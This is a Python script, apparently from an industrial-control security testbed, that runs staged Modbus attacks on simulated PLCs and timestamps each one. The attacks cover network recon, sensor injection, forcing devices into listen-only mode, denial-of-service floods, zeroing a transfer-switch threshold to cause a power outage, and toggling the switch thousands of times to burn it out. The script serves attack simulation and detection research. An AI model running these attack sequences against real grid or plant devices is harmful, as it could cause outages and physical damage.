"""
Author: Jaxson Brown
Date: 07/10/2024
Purpose: Executes attacks from the "attacker.py" script. The attacks
    are executed in procedures to simulate staged attacks, similar to
    how it's done in the real-world.
"""

import attacker
import random
import time
import subprocess
from datetime import timezone
import datetime

# constants
FILENAME = "timestamps/"+datetime.datetime.now(timezone.utc).strftime('%d-%M:%S-timestamps.txt')

#########################################################################################
# Objective 1: Reconnaissance
def recon():
    # port/address scan
    attacker.address_scan("192.168.0.0/24")
    time.sleep(5)
    # found Modbus devices - 192.168.0.21, 192.168.0.22
    attacker.function_code_scan(["192.168.0.21", "192.168.0.22"])
    time.sleep(5)
    # device identification - function code 0x08
    attacker.device_identification_attack(["192.168.0.21", "192.168.0.22"])
    time.sleep(5)
    # naively read sensor values to find used coils/registers
    attacker.naive_sensor_read(["192.168.0.21", "192.168.0.22"])


#########################################################################################
# Objective 2: Sporadic Injection
def sporadic_injections():
    # port/address scan
    attacker.address_scan("192.168.0.0/24")
    time.sleep(5)
    # found Modbus devices - 192.168.0.21, 192.168.0.22
    # inject values sporadically to all devices
    attacker.sporadic_sensor_measurement_injection(["192.168.0.21", "192.168.0.22"])

    # reset damaged devices
    time.sleep(1)
    subprocess.run(
        ['docker-compose', '-f', '../simulation/docker-compose.yml', 'restart', "plc1", "plc2"],
        check=True,
        capture_output=True,
        text=True
    )


#########################################################################################
# Objective 3: Disable service through Force Listen Mode
def disable_devices():
    # scan network
    attacker.address_scan("192.168.0.0/24")
    time.sleep(5)
    # found Modbus devices - 192.168.0.21, 192.168.0.22
    attacker.force_listen_mode(["192.168.0.21", "192.168.0.22"])
    
    # reset damaged devices
    time.sleep(30)
    subprocess.run(
        ['docker-compose', '-f', '../simulation/docker-compose.yml', 'restart', "plc1", "plc2"],
        check=True,
        capture_output=True,
        text=True
    )


#########################################################################################
# Objective 4: Disable service through Restart Communication
def disable_devices_through_restarting():
    # scan network
    attacker.address_scan("192.168.0.0/24")
    time.sleep(5)
    # send multiple Restart Communication requests (until enter key is pressed)
    attacker.restart_communication(["192.168.0.21", "192.168.0.22"])


#########################################################################################
# Objective 5: DOS Servers
def dos():
    # flood with connection requests
    attacker.connection_flood_attack(["192.168.0.21", "192.168.0.22"])
    # flood with random read requests
    attacker.data_flood_attack(["192.168.0.21", "192.168.0.22"])


#########################################################################################
# Objective 6: Attempt to find device-related exploits
def find_exploits():
    # address scan to find Modbus devices
    attacker.address_scan("192.168.0.0/24")
    time.sleep(5)
    # device identification attack for device-related exploits
    attacker.device_identification_attack(["192.168.0.21", "192.168.0.22"])


#########################################################################################
# Objective 7: Cause power outage for a house
def power_outage():
    # get information to find control set points to change
    attacker.address_scan("192.168.0.0/24")
    time.sleep(5)
    attacker.function_code_scan(["192.168.0.21", "192.168.0.22"])
    time.sleep(5)
    attacker.naive_sensor_read(["192.168.0.21", "192.168.0.22"])
    time.sleep(5)
    # pick a device
    device_dict = {"plc1": "192.168.0.21", "plc2": "192.168.0.22"}
    victim = random.choice(list(device_dict.items()))
    # change the transfer switch threshold to 0
    print(victim[1])
    attacker.altered_control_set_points([victim[1]], 0)
    # ICS will now switch to solar power even when there is none
    time.sleep(30)

    # reset damaged device
    subprocess.run(
        ['docker-compose', '-f', '../simulation/docker-compose.yml', 'restart', victim[0]],
        check=True,
        capture_output=True,
        text=True
    )


#########################################################################################
# Objective 8: Burn out transfer switch
def destroy_switch():
    # get information to find values controlling transfer switch
    attacker.address_scan("192.168.0.0/24")
    time.sleep(5)
    attacker.function_code_scan(["192.168.0.21", "192.168.0.22"])
    time.sleep(5)
    attacker.naive_sensor_read(["192.168.0.21", "192.168.0.22"])
    time.sleep(5)
    # pick a device
    device_dict = {"plc1": "192.168.0.21", "plc2": "192.168.0.22"}
    victim = random.choice(list(device_dict.items()))
    # repeatedly switch over the transfer switch to simulate burning it out
    for _ in range(3000):
        attacker.altered_actuator_state([victim[1]], 1)
        attacker.altered_actuator_state([victim[1]], 2)
        time.sleep(0.01)


#########################################################################################
# Objective 9: Replay captured data to mask broken sensors
# TODO:


#########################################################################################
# Objective 10: Simulate greater-than-normal solar power generation
# TODO:


def start_attack(func, objective_number):
        # print to file timestamping when attack starts
        dt = datetime.datetime.now(timezone.utc)
        formatted_time = dt.strftime('%H:%M:%S') + f'.{dt.microsecond}'
        with open(FILENAME, 'a') as file:
            file.write(f'objective{objective_number}: {formatted_time} : start\n')

        # perform attack
        print(f"\n\nObjective {objective_number} started\n\n")
        func()
        print(f"\n\nObjective {objective_number} finished\n\n")

        # print to file timestamping when attack ends
        dt = datetime.datetime.now(timezone.utc)
        formatted_time = dt.strftime('%H:%M:%S') + f'.{dt.microsecond}'
        with open(FILENAME, 'a') as file:
            file.write(f'objective{objective_number}: {formatted_time} : end\n')

if __name__ == "__main__":
    print(r"""\
    \            _    _            _
     \          | |  | |          | |
      \\        | |__| | __ _  ___| | __
       \\       |  __  |/ _` |/ __| |/ /
        >\/7    | |  | | (_| | (__|   <
    _.-(6'  \   |_|  |_|\__,_|\___|_|\_\
   (=___._/` \         _   _
        )  \ |        | | | |
       /   / |        | |_| |__   ___
      /    > /        | __| '_ \ / _ \
     j    < _\        | |_| | | |  __/
 _.-' :      ``.       \__|_| |_|\___|
 \ r=._\        `.
<`\\_  \         .`-.          _____  _                  _   _
 \ r-7  `-. ._  ' .  `\       |  __ \| |                | | | |
  \`,      `-.`7  7)   )      | |__) | | __ _ _ __   ___| |_| |
   \/         \|  \'  / `-._  |  ___/| |/ _` | '_ \ / _ \ __| |
              ||    .'        | |    | | (_| | | | |  __/ |_|_|
               \\  (          |_|    |_|\__,_|_| |_|\___|\__(_)
                >\  >
            ,.-' >.'
           <.'_.''
             <''
             """)

    while True:
        selections = list(range(1, 9))

        while selections:
            # perform a random attack, ensuring each attack is performed once
            selection = random.choice(selections)
            selections.remove(selection)

            print("Waiting a random amount of time (4 to 7 minutes) before next attack...")
            wait_time = random.randint(4 * 60, 7 * 60)

            time.sleep(wait_time)

            # perform attack
            if selection == 1:
                start_attack(recon, 1)
            elif selection == 2:
                start_attack(sporadic_injections, 2)
            elif selection == 3:
                start_attack(disable_devices, 3)
            elif selection == 4:
                start_attack(disable_devices_through_restarting, 4)
            elif selection == 5:
                start_attack(dos, 5)
            elif selection == 6:
                start_attack(find_exploits, 6)
            elif selection == 7:
                start_attack(power_outage, 7)
            elif selection == 8:
                start_attack(destroy_switch, 8)